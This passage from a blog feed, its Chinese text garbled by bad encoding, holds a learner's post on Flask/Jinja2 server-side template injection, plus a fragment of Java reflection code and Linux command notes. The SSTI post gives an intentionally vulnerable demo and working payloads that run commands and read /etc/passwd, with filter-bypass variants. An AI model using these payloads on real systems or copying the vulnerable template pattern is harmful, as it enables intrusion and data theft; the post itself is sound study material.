class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSTIï¼ˆåƒh3å¸ˆå‚…å­¦ä¹ ï¼‰</title>
    <link href="/2022/03/15/SSTI%EF%BC%88%E5%83%8Fh3%E5%B8%88%E5%82%85%E5%AD%A6%E4%B9%A0%EF%BC%89/"/>
    <url>/2022/03/15/SSTI%EF%BC%88%E5%83%8Fh3%E5%B8%88%E5%82%85%E5%AD%A6%E4%B9%A0%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><p>è¿˜æ˜¯ä»Šå¤©é¢è¯•é—®é“äº†ï¼Œå¾ˆæ— è¯­ã€‚æ˜æ˜å­¦è¿‡äº†è¿˜æ˜¯ä¸ä¼šã€‚</p><p>è·Ÿç€h3æ¥å­¦ä¸€ä¸‹sstiï¼ˆ<a href="http://h3geeker.top/posts/b0c48792.html#toc-heading-1">h3</a>å¸ˆå‚…å†™çš„pythonä¸­çš„sstiï¼‰ã€‚</p><h2 id="Flask"><a href="#Flask" class="headerlink" title="Flask"></a>Flask</h2><p>è·Ÿä¸€ä¸‹<a href="https://www.w3cschool.cn/flask/flask_overview.html">w3cschool</a>å­¦ä¹ å§ã€‚</p><h3 id="ä»€ä¹ˆæ˜¯Flask"><a href="#ä»€ä¹ˆæ˜¯Flask" class="headerlink" title="ä»€ä¹ˆæ˜¯Flask"></a>ä»€ä¹ˆæ˜¯Flask</h3><p>Flaskæ˜¯ä¸€ä¸ªç”¨Pythonç¼–å†™çš„Webåº”ç”¨ç¨‹åºæ¡†æ¶ã€‚</p><h3 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h3><p>é…ç½®ä¸€ä¸‹ç¯å¢ƒï¼Œæ˜¯çœŸçš„ç¦»è°±ï¼Œ<strong>æŒ‚äº†vpnä¸€ç›´æŠ¥é”™</strong>ã€‚æœ€åæŠŠvpnå…³äº†ï¼Œä¸€ä¸‹å°±å¥½äº†ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203152240237.png" alt="QQæˆªå›¾20220315211150"></p><h3 id="ç¬¬ä¸€ä¸ªflaskåº”ç”¨"><a href="#ç¬¬ä¸€ä¸ªflaskåº”ç”¨" class="headerlink" title="ç¬¬ä¸€ä¸ªflaskåº”ç”¨"></a>ç¬¬ä¸€ä¸ªflaskåº”ç”¨</h3><p>å¿…é¡»åœ¨é¡¹ç›®ä¸­å¯¼å…¥Flaskæ¨¡å—ã€‚ </p><p>Flaskç±»çš„ä¸€ä¸ªå¯¹è±¡æ˜¯æˆ‘ä»¬çš„<strong>WSGI</strong>åº”ç”¨ç¨‹åºã€‚</p><p><strong>WSGI</strong>åº”ç”¨ç¨‹åºï¼š<strong>WSGIï¼Œå…¨ç§° Web Server Gateway Interfaceï¼Œæˆ–è€… Python Web Server Gateway Interface ï¼Œæ˜¯ä¸º Python è¯­è¨€å®šä¹‰çš„ Web æœåŠ¡å™¨å’Œ Web åº”ç”¨ç¨‹åºæˆ–æ¡†æ¶ä¹‹é—´çš„ä¸€ç§ç®€å•è€Œé€šç”¨çš„æ¥å£ã€‚</strong></p><p><strong>wsgiæ˜¯ä¸€ä¸ªwebç»„ä»¶çš„æ¥å£é˜²èŒƒï¼Œwsgiå°†webç»„ä»¶åˆ†ä¸ºä¸‰ç±»ï¼šwebæœåŠ¡å™¨ï¼Œwebä¸­é—´ä»¶ï¼Œwebåº”ç”¨ç¨‹åº</strong></p><p>Flaskæ„é€ å‡½æ•°ä½¿ç”¨<strong>å½“å‰æ¨¡å—ï¼ˆ__name __ï¼‰</strong>çš„åç§°ä½œä¸ºå‚æ•°ã€‚</p><p>Flaskç±»çš„**route()**å‡½æ•°æ˜¯ä¸€ä¸ªè£…é¥°å™¨ï¼Œå®ƒå‘Šè¯‰åº”ç”¨ç¨‹åºå“ªä¸ªURLåº”è¯¥è°ƒç”¨ç›¸å…³çš„å‡½æ•°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">app.route(rule, options)<br><br>//rule å‚æ•°è¡¨ç¤ºä¸è¯¥å‡½æ•°çš„URLç»‘å®šã€‚<br><br>//options æ˜¯è¦è½¬å‘ç»™åŸºç¡€Ruleå¯¹è±¡çš„å‚æ•°åˆ—è¡¨ã€‚<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203152128322.png" alt="QQæˆªå›¾20220315212747"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203152240893.png" alt="QQæˆªå›¾20220315212650"></p><p>è¿™é‡Œå°±ç®€å•äº†è§£ä¸€ä¸‹ã€‚åç»­åœ¨ç»§ç»­å­¦ä¹ ã€‚</p><h2 id="Jinjaæ¨¡æ¿"><a href="#Jinjaæ¨¡æ¿" class="headerlink" title="Jinjaæ¨¡æ¿"></a>Jinjaæ¨¡æ¿</h2><h3 id="ç‰¹ç‚¹"><a href="#ç‰¹ç‚¹" class="headerlink" title="ç‰¹ç‚¹"></a>ç‰¹ç‚¹</h3><figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nim">&#123;<span class="hljs-meta">&#123;...&#125;</span>&#125;:è£…è½½ä¸€ä¸ªå˜é‡ï¼Œæ¨¡æ¿æ¸²æŸ“æ—¶ï¼Œä¼šä½¿ç”¨ä¼ è¿›æ¥çš„åŒåå‚æ•°å˜é‡çš„ä»£è¡¨å€¼æ›¿æ¢<br>&#123;%...%&#125;:è£…è½½ä¸€ä¸ªæ§åˆ¶è¯­å¥<br>&#123;<span class="hljs-comment">#...#&#125;:è£…è½½ä¸€ä¸ªæ³¨é‡Šï¼Œæ¨¡æ¿æ¸²æŸ“çš„æ—¶å€™ä¼šå¿½è§†è¿™ä¸­é—´çš„å€¼</span><br></code></pre></td></tr></table></figure><h3 id="Jinja2ä¸­forå¾ªç¯çš„å†…ç½®å¸¸é‡"><a href="#Jinja2ä¸­forå¾ªç¯çš„å†…ç½®å¸¸é‡" class="headerlink" title="Jinja2ä¸­forå¾ªç¯çš„å†…ç½®å¸¸é‡"></a>Jinja2ä¸­forå¾ªç¯çš„å†…ç½®å¸¸é‡</h3><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203152134784.png" alt="QQæˆªå›¾20220315213343"></p><h3 id="è¿‡æ»¤å™¨"><a href="#è¿‡æ»¤å™¨" class="headerlink" title="è¿‡æ»¤å™¨"></a>è¿‡æ»¤å™¨</h3><p>è¿‡æ»¤å™¨æ˜¯é€šè¿‡ç®¡é“ç¬¦<code>|</code>æ¥ä½¿ç”¨çš„ï¼Œä¾‹å¦‚<code>&#123;&#123;name|length&#125;&#125;</code>ï¼šæ¥è¿”å›nameçš„é•¿åº¦</p><p>è¿‡æ»¤å™¨æƒ³å½“äºä¸€ä¸ªå‡½æ•°ï¼ŒæŠŠå½“å‰çš„å˜é‡ä¼ å…¥åˆ°è¿‡æ»¤å™¨ä¸­ï¼Œç„¶åè¿‡æ»¤å™¨æ ¹æ®è‡ªå·±çš„åŠŸèƒ½ï¼Œå†è¿”å›ç›¸åº”çš„å€¼ç„¶åæŠŠç»“æœæ¸²æŸ“åˆ°é¡µé¢ä¸­ã€‚</p><p>å›åˆ°ä¸»é¢˜ï¼</p><h2 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h2><p>æ¼æ´æˆå› å°±æ˜¯æœåŠ¡ç«¯æ¥æ”¶äº†ç”¨æˆ·çš„æ¶æ„è¾“å…¥ä»¥åï¼Œæœªç»ä»»ä½•å¤„ç†å°±å°†å…¶ä½œä¸º Web åº”ç”¨æ¨¡æ¿å†…å®¹çš„ä¸€éƒ¨åˆ†ï¼Œæ¨¡æ¿å¼•æ“åœ¨è¿›è¡Œç›®æ ‡ç¼–è¯‘æ¸²æŸ“çš„è¿‡ç¨‹ä¸­ï¼Œæ‰§è¡Œäº†ç”¨æˆ·æ’å…¥çš„å¯ä»¥ç ´åæ¨¡æ¿çš„è¯­å¥ï¼Œå› è€Œå¯èƒ½å¯¼è‡´äº†æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€ä»£ç æ‰§è¡Œã€GetShell ç­‰é—®é¢˜ã€‚å…¶å½±å“èŒƒå›´ä¸»è¦å–å†³äºæ¨¡ç‰ˆå¼•æ“çš„å¤æ‚æ€§</p><p><strong>å¦‚æœå†æ¸²æŸ“ä¹‹å‰ï¼Œå­˜åœ¨æ¥å—ç”¨æˆ·è¾“å…¥çš„æ“ä½œï¼Œå¹¶ä¸”æœªç»ä»»ä½•å¤„ç†å°±å°†å…¶ä½œä¸º Web åº”ç”¨æ¨¡æ¿å†…å®¹çš„ä¸€éƒ¨åˆ†ï¼Œå°±æœ‰å¯èƒ½é€ æˆSSTiæ¼æ´çš„äº§ç”Ÿ</strong>ã€‚</p><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><span class="hljs-keyword">from</span> jinja2 <span class="hljs-keyword">import</span> Template<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/xsw6a&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    name = request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;guest&#x27;</span>)<br><br>    t = Template(<span class="hljs-string">&quot;Hello &quot;</span> + name)<br>    <span class="hljs-keyword">return</span> t.render()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run()<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203152240297.png" alt="QQæˆªå›¾20220315214324"></p><p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°†è¿™é‡Œçš„8*8æ¢æˆåˆ«çš„pythonå‡½æ•°ï¼Œæ¥å›æ˜¾ç»“æœã€‚è·å–æ•°æ®ã€‚</p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>ç”±äºåœ¨jinja2ä¸­æ˜¯å¯ä»¥ç›´æ¥è®¿é—®pythonçš„ä¸€äº›å¯¹è±¡åŠå…¶æ–¹æ³•çš„ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡æ„é€ ç»§æ‰¿é“¾æ¥æ‰§è¡Œä¸€äº›æ“ä½œï¼Œæ¯”å¦‚æ–‡ä»¶è¯»å–ï¼Œå‘½ä»¤æ‰§è¡Œç­‰ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203152240038.png" alt="QQæˆªå›¾20220315214759"></p><h3 id="åˆ©ç”¨é­”æœ¯æ–¹æ³•"><a href="#åˆ©ç”¨é­”æœ¯æ–¹æ³•" class="headerlink" title="åˆ©ç”¨é­”æœ¯æ–¹æ³•"></a>åˆ©ç”¨é­”æœ¯æ–¹æ³•</h3><ul><li>classè¿”å›[]æ‰€å±çš„å¯¹è±¡</li><li>class+base:è¿”å›è¿™ä¸ªå¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»</li><li>class+base+subclasses:æ‰¾åˆ°äº†è¿™ä¸ªå¯¹è±¡çš„åŸºç±»ï¼Œé‚£ä¹ˆå°±è¿”å›è¿™ä¸ªåŸºç±»ä¸‹æ‰€å…·æœ‰çš„å­ç±»</li></ul><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203152240131.png" alt="QQæˆªå›¾20220315220342"></p><p>ç±»ï¼Œåœ¨è¿™é‡Œé¢æˆ‘ä»¬ä¸ä¹å¯ä»¥æ‰¾åˆ°æˆ‘ä»¬è¦ç”¨çš„å­ç±»å¦‚å‰æ–‡æ‰€æåˆ°çš„ï¼šfileã€openç­‰ç­‰ã€‚</p><p>è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªå°æŠ€å·§ï¼š</p><p>å¯ä»¥é€šè¿‡notepad++ï¼Œå¿«é€ŸæŸ¥æ‰¾ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203152240571.png" alt="QQæˆªå›¾20220315222043"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> &#123;&#125;.__class__.__base()<br>        <span class="hljs-built_in">print</span>(c)<br></code></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´å¯ä»¥æ‰¾åˆ°ä¸€äº›å‘½ä»¤æ‰§è¡Œçš„ä¸œè¥¿ã€‚</p><p>è¿™äº›å‘½ä»¤çš„ä¸œè¥¿å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°ã€‚</p><h3 id="1ã€os-system"><a href="#1ã€os-system" class="headerlink" title="1ã€os.system()"></a>1ã€os.system()</h3><p>ç”¨æ³•ï¼šos.system(command)<br>ä½†æ˜¯ç”¨è¿™ä¸ªæ— æ³•å›æ˜¾ã€‚</p><h3 id="2ã€os-popen"><a href="#2ã€os-popen" class="headerlink" title="2ã€os.popen()"></a>2ã€os.popen()</h3><p>ç”¨æ³•ï¼šos.popen(command[,mode[,bufsize]])</p><p>popenæ–¹æ³•é€šè¿‡p.read()è·å–ç»ˆç«¯è¾“å‡ºï¼Œè€Œä¸”popenéœ€è¦å…³é—­close().å½“æ‰§è¡ŒæˆåŠŸæ—¶ï¼Œclose()ä¸è¿”å›ä»»ä½•å€¼ï¼Œå¤±è´¥æ—¶ï¼Œclose()è¿”å›ç³»ç»Ÿè¿”å›å€¼ï¼ˆå¤±è´¥è¿”å›1ï¼‰. å¯è§å®ƒè·å–è¿”å›å€¼çš„æ–¹å¼å’Œos.systemä¸åŒã€‚<br>è¿˜éœ€è¦äº†è§£ä¸€ä¸ªé­”æ³•å‡½æ•°<br>globalsè¯¥å±æ€§æ˜¯å‡½æ•°ç‰¹æœ‰çš„å±æ€§,è®°å½•å½“å‰æ–‡ä»¶å…¨å±€å˜é‡çš„å€¼,å¦‚æœæŸä¸ªæ–‡ä»¶è°ƒç”¨äº†osã€sysç­‰åº“,ä½†æˆ‘ä»¬åªèƒ½è®¿é—®è¯¥æ–‡ä»¶æŸä¸ªå‡½æ•°æˆ–è€…æŸä¸ªå¯¹è±¡ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨globalså±æ€§è®¿é—®å…¨å±€çš„å˜é‡ã€‚è¯¥å±æ€§ä¿å­˜çš„æ˜¯å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸å¼•ç”¨ã€‚</p><p>å¤§ä½“å°±æ˜¯è¿™æ ·å§ã€‚å§‘ä¸”äº†è§£ä¸€ä¸‹ã€‚</p><p>å›å½’æ­£é¢˜ã€‚ä»Šå¤©æŠ¤ç½‘çš„å¸ˆå‚…é—®æˆ‘é—®é¢˜ã€‚ç„¶åæˆ‘å¾ˆç„¦è™‘ã€‚é—®äº†æˆ‘ä¸€äº›bypassé—®é¢˜ã€‚å…¶ä¸­æœ‰ä¸€ä¸ªå°±æ˜¯sstiçš„ã€‚å®³!</p><p>çœ‹çœ‹h3å¸ˆå‚…çš„ã€‚</p><h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><p>1ã€æ‹¼æ¥ï¼ˆè¿‡æ»¤äº†å‘½ä»¤æ‰§è¡Œçš„å‡½æ•°ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">object</span>.__subclasses__()[<span class="hljs-number">59</span>].__init__.func_globals[<span class="hljs-string">&#x27;linecache&#x27;</span>].__dict__[<span class="hljs-string">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>].__dict__[<span class="hljs-string">&#x27;sy&#x27;</span>+<span class="hljs-string">&#x27;stem&#x27;</span>](<span class="hljs-string">&#x27;ls&#x27;</span>)<br></code></pre></td></tr></table></figure><p>2ã€è¿‡æ»¤[]ï¼ˆè¿™é‡Œh3å¸ˆå‚…çš„æ²¡æœ‰ç†è§£åˆ°ï¼‰</p><p>å€ŸåŠ©requestå¯¹è±¡ï¼š<br>requestå˜é‡å¯ä»¥è®¿é—®æ‰€æœ‰å·²å‘é€çš„å‚æ•°ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥request.args.paramç”¨æ¥æ£€ç´¢æ–°çš„paramGETå‚æ•°çš„å€¼,å°†å…¶ä¸­çš„request.argsæ”¹ä¸ºrequest.valuesåˆ™åˆ©ç”¨postçš„æ–¹å¼è¿›è¡Œä¼ å‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123; ().__class__.__bases__.__getitem__(<span class="hljs-number">0</span>).__subclasses__().pop(<span class="hljs-number">40</span>)(request.args.path).read() &#125;&#125;&amp;path=/etc/passwd<br></code></pre></td></tr></table></figure><p><strong>å…¶ä»–å¤„çš„ï¼š</strong></p><ul><li>å¦‚æœå¯¹æˆ‘ä»¬ç‰¹å®šçš„å‚æ•°è¿›è¡Œäº†ä¸¥æ ¼çš„è¿‡æ»¤ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨<code>request</code>æ¥è¿›è¡Œç»•è¿‡ï¼Œrequestå¯ä»¥è·å¾—è¯·æ±‚çš„ç›¸å…³ä¿¡æ¯ï¼Œæˆ‘ä»¬æ‹¿è¿‡æ»¤<code>__class__</code>ï¼Œå¯ä»¥ç”¨<code>request.args.t1</code>ä¸”ä»¥GETæ–¹å¼æäº¤<code>t1=__class__</code>æ¥æ›¿æ¢è¢«è¿‡æ»¤çš„<code>__class__</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.__class__&#125;&#125; =&gt; &#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>[request.args.t1]&#125;&#125;&amp;t1=__class__<br></code></pre></td></tr></table></figure><p>3ã€è¿‡æ»¤åŒä¸‹åˆ’çº¿__</p><ul><li>ç¼–ç ç»•è¿‡          _<code>æ˜¯</code>\x5f<code>ï¼Œ</code>.<code>æ˜¯</code>\x2E</li><li></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;<br><span class="hljs-string">&#x27;&#x27;</span>[request.args.<span class="hljs-keyword">class</span>][request.args.mro][<span class="hljs-number">2</span>][request.args.subclasses]()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>).read()<br>&#125;&#125;&amp;<span class="hljs-keyword">class</span>=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__<br></code></pre></td></tr></table></figure><p>è¿™é‡Œä¸€ä¸‹åˆæ˜ç™½äº†ä¸Šé¢h3å¸ˆå‚…çš„æ„æ€ã€‚</p><p>4ã€è¿‡æ»¤ä¸€äº›å‡½æ•°åå¦‚__import__ç­‰</p><p>pythonçš„åˆå§‹æ¨¡å—_builtin__é‡Œæœ‰å¾ˆå¤šå±é™©çš„æ–¹æ³•ï¼Œä¸€æ¡è·¯æ²¡äº†å°±æ‰¾æ‰¾å…¶ä»–çš„è·¯<br>æˆ‘ä»¬å¯ä»¥ç›´æ¥ç”¨ eval() exec() execfile()ç­‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">__builtins__.<span class="hljs-built_in">eval</span>()<br></code></pre></td></tr></table></figure><p>5ã€ç»•è¿‡configå‚æ•°</p><p><code>&#123;&#123;config&#125;&#125;</code>å¯ä»¥è·å–å½“å‰è®¾ç½®ï¼Œå¦‚æœé¢˜ç›®ç±»ä¼¼<code>app.config [&#39;FLAG&#39;] = os.environ.popï¼ˆ&#39;FLAG&#39;ï¼‰</code>ï¼Œé‚£å¯ä»¥ç›´æ¥è®¿é—®<code>&#123;&#123;config['FLAG']&#125;&#125;</code>æˆ–è€…<code>&#123;&#123;config.FLAG&#125;&#125;</code>å¾—åˆ°flag<br>ä½†æ˜¯å¦‚æœè¢«è¿‡æ»¤äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;self&#125;&#125; â‡’ &lt;TemplateReference <span class="hljs-literal">None</span>&gt;<br>&#123;&#123;self.__dict__._TemplateReference__context.config&#125;&#125; â‡’ åŒæ ·å¯ä»¥æ‰¾åˆ°config<br></code></pre></td></tr></table></figure><p>6ã€åˆ é™¤äº†å¾ˆå¤šæ¨¡å—ï¼Œä½†æ˜¯æ²¡æœ‰åˆ é™¤reload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">reload(__builtins__)ï¼Œé‡æ–°åŠ è½½è¢«åˆ é™¤çš„æ¨¡å—ï¼Œç›´æ¥å‘½ä»¤æ‰§è¡Œï¼Œåªç”¨äºpy2 <br></code></pre></td></tr></table></figure><p>7ã€è¿‡æ»¤å°ç‚¹å·</p><p>å¯ä»¥é‡‡ç”¨ç»•è¿‡</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">attr</span><span class="hljs-params">()</span></span>æˆ–<span class="hljs-selector-attr">[]</span><br></code></pre></td></tr></table></figure><p>8ã€è¿‡æ»¤æ‹¬å·</p><p>å¯ä»¥ä½¿ç”¨{ % % }ä¸­é—´å¯ä»¥æ‰§è¡Œifè¯­å¥ï¼Œåˆ©ç”¨è¿™ä¸€ç‚¹å¯ä»¥è¿›è¡Œç±»ä¼¼ç›²æ³¨çš„æ“ä½œæˆ–è€…å¤–å¸¦ä»£ç æ‰§è¡Œç»“æœ</p>]]></content>
    
    
    <categories>
      
      <category>SSTI</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LinuxçŸ¥è¯†ç‚¹</title>
    <link href="/2022/03/15/Linux%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    <url>/2022/03/15/Linux%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<h1 id="LinuxçŸ¥è¯†ç‚¹"><a href="#LinuxçŸ¥è¯†ç‚¹" class="headerlink" title="LinuxçŸ¥è¯†ç‚¹"></a>LinuxçŸ¥è¯†ç‚¹</h1><p>ä»Šå¤©å¾ˆå—æ‰“å‡»ï¼Œé¢è¯•é—®äº†å‡ ä¸ªéå¸¸ç®€å•çš„é—®é¢˜æˆ‘éƒ½æ²¡æœ‰å›ç­”ä¸Šæ¥ã€‚ï¼ˆå…¶å®éƒ½é‡åˆ°è¿‡ï¼Œåªä¸è¿‡çœŸçš„æ˜¯å¿˜äº†ã€‚å¾ˆéš¾å—ã€‚é¢è¯•æ•ˆæœæ˜¯çœŸçš„å·®åŠ²ã€‚ï¼‰</p><h2 id="Linuxå¸¸ç”¨è¾“å‡ºæ–‡ä»¶æ€»ç»“"><a href="#Linuxå¸¸ç”¨è¾“å‡ºæ–‡ä»¶æ€»ç»“" class="headerlink" title="Linuxå¸¸ç”¨è¾“å‡ºæ–‡ä»¶æ€»ç»“"></a>Linuxå¸¸ç”¨è¾“å‡ºæ–‡ä»¶æ€»ç»“</h2><ul><li>catï¼Œè¾“å‡ºå…¨éƒ¨å†…å®¹ã€‚</li><li>hearï¼Œè¾“å‡ºå‰10è¡Œå†…å®¹ã€‚</li><li>tail</li><li>moreï¼Œè¾“å‡ºå‰10è¡Œï¼Œåç»­å†…å®¹ä»¥ç™¾åˆ†æ¯”æ˜¾ç¤ºï¼Œå›è½¦é”®ç»§ç»­è¾“å‡ºï¼ŒæŒ‰qé”®é€€å‡ºã€‚</li><li>lessï¼Œå¯ç¿»é¡µè¾“å‡ºã€‚</li><li>vimã€‚</li><li>grepï¼ˆåŒæ ·ä¹Ÿå¯ä»¥ï¼Œå‰ææ˜¯çŸ¥é“æ–‡ä»¶æŸäº›å†…å®¹ï¼‰</li></ul><h2 id="ä¿®æ”¹æ–‡ä»¶æƒé™çš„åŒºåˆ«"><a href="#ä¿®æ”¹æ–‡ä»¶æƒé™çš„åŒºåˆ«" class="headerlink" title="ä¿®æ”¹æ–‡ä»¶æƒé™çš„åŒºåˆ«"></a>ä¿®æ”¹æ–‡ä»¶æƒé™çš„åŒºåˆ«</h2><ol><li>chown (change owner) ï¼š <strong>ä¿®æ”¹</strong>æ‰€å±ç”¨æˆ·ä¸ç»„ã€‚</li><li>chmod (change mode) ï¼š <strong>ä¿®æ”¹</strong>ç”¨æˆ·çš„<strong>æƒé™</strong>ã€‚</li><li>chgrpï¼ˆchange groupï¼‰:   <strong>ä¿®æ”¹</strong>æ‰€å±ç»„ã€‚</li></ol><h2 id="Linuxè¿›ç¨‹æŸ¥è¯¢"><a href="#Linuxè¿›ç¨‹æŸ¥è¯¢" class="headerlink" title="Linuxè¿›ç¨‹æŸ¥è¯¢"></a>Linuxè¿›ç¨‹æŸ¥è¯¢</h2><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos">ps <span class="hljs-built_in">aux</span><br></code></pre></td></tr></table></figure><p>aï¼šæ˜¾ç¤ºå½“å‰ç»ˆç«¯ä¸‹çš„æ‰€æœ‰è¿›ç¨‹ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç”¨æˆ·çš„è¿›ç¨‹ã€‚</p><p>uï¼šä½¿ç”¨ä»¥ç”¨æˆ·ä¸ºä¸»çš„æ ¼å¼è¾“å‡ºè¿›ç¨‹ä¿¡æ¯ã€‚</p><p>xï¼šæ˜¾ç¤ºå½“å‰ç”¨æˆ·åœ¨æ‰€æœ‰ç»ˆç«¯ä¸‹çš„è¿›ç¨‹ã€‚</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ps -elf</span><br></code></pre></td></tr></table></figure><p>-eï¼šæ˜¾ç¤ºç³»ç»Ÿç±»æ‰€æœ‰è¿›ç¨‹ä¿¡æ¯ã€‚</p><p>-lï¼šä½¿ç”¨é•¿ï¼ˆlongï¼‰æ ¼å¼æ˜¾ç¤ºè¿›ç¨‹ä¿¡æ¯ã€‚</p><p>-fï¼šä½¿ç”¨å®Œæ•´çš„ï¼ˆfullï¼‰æ ¼å¼æ˜¾ç¤ºè¿›ç¨‹ä¿¡æ¯ã€‚</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq"><span class="hljs-built_in">top</span><br></code></pre></td></tr></table></figure><p>ä»¥å…¨å±äº¤äº’å¼çš„ç•Œé¢æ˜¾ç¤ºè¿›ç¨‹æ’åï¼ŒåŠæ—¶è·Ÿè¸ªåŒ…æ‹¬CPUã€å†…å­˜ç­‰ç³»ç»Ÿèµ„æºå ç”¨æƒ…å†µï¼Œé»˜è®¤æƒ…å†µä¸‹æ¯ä¸‰ç§’åˆ·æ–°ä¸€æ¬¡ï¼Œå…¶ä½œç”¨åŸºæœ¬ç±»ä¼¼äºWindowsç³»ç»Ÿä¸­çš„ä»»åŠ¡ç®¡ç†å™¨ã€‚</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">pstree -aup</span><br></code></pre></td></tr></table></figure><p>æ€»ç»“ï¼špsï¼ˆç‰¹æ®Šæƒ…å†µæ ‘å½¢ï¼‰å’Œtop</p><h2 id="Linuxæ—¥å¿—æŸ¥è¯¢"><a 